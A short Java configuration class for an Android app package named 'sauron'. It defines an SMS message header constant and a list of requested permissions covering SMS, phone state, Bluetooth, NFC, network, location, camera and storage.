package com.hotservice.sauron.utils;

import android.Manifest;

public class Config {
    public static final String SMS_HEAD = "|SAURON|";

    public static String[] PERMISSIONS = new String[]{
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,

            Manifest.permission.READ_PHONE_STATE,

            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_ADMIN,

            Manifest.permission.NFC,

            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,

            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,

            Manifest.permission.CAMERA,

            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
    };
}
